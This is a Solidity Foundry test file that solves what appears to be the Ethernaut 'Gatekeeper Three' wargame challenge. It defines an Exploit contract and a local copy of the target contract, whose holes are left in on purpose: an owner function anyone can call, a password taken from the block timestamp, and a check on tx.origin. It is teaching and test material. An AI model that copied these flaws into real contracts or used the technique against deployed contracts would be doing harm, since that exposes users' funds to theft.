// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract GatekeeperExploitTest is Test {
    GatekeeperThree gate;
    Exploit exp;
    address me = makeAddr("me");
    function setUp() public {
        gate = new GatekeeperThree();
        exp = new Exploit();
    }

    function testExploitEntrant() public {
        uint256 password = block.timestamp;
        gate.createTrick();

        vm.prank(address(exp));
        gate.construct0r();
        gate.getAllowance(password);

        address(gate).call{value: 0.00101 ether}("");

        vm.prank(address(me));
        exp.enter(payable(gate));

        assertEq(gate.entrant(), DEFAULT_SENDER, "No Entrant claimed");
    }
}

contract Exploit {
    function enter(address payable at) external {
        GatekeeperThree t = GatekeeperThree(at);
        t.enter();
    }
    receive() external payable {
        // assembly {
        //     mstore(0x0, 0x0)
        //     return(0, 0x20)
        // }
        revert();
    }
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        console.log("Gate 1");
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        console.log("Gate 2");
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        bool response = payable(owner).send(0.001 ether);
        console.log("Response", address(this).balance, response);
        if (address(this).balance > 0.001 ether && response == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        console.log("CLAIMED");
        entrant = tx.origin;
    }

    receive() external payable {}
}
